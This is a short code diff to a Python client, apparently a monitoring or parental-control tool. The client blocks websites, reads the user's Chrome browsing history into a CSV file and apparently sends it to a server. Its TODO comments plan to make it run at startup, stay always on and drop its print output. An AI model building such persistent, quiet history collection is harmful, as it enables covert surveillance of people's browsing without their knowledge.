@@ -23,17 +23,7 @@ def operating_system():#TODO add startup capability
     if os_name == "Linux":
         default_folder = linux_host
     elif os_name == "Windows":
-        default_folder = window_host
-
-
-def operating_system():
-    global default_folder
-    os_name = platform.system()
-    if os_name == "Linux":
-        default_folder = linux_host
-    elif os_name == "Windows":
-        default_folder = window_host
-        
+        default_folder = window_host     
         
 
 class Client():  # TODO: ip working,make it exe,always on - turns on restart, all print() wiil be deleted
@@ -59,7 +49,6 @@ class Client():  # TODO: ip working,make it exe,always on - turns on restart, al
         while True:
             self.block_websites() 
             self.limitation()
-            time.sleep(2)
             self.history()
                      
     def first_message(self):
@@ -98,6 +87,7 @@ class Client():  # TODO: ip working,make it exe,always on - turns on restart, al
         except Exception:
             self.try_connect()
         else:
+            time.sleep(0.5)
             bh.get_browserhistory()   
             bh.write_browserhistory_csv()
             f = open("chrome_history.csv", "rb")
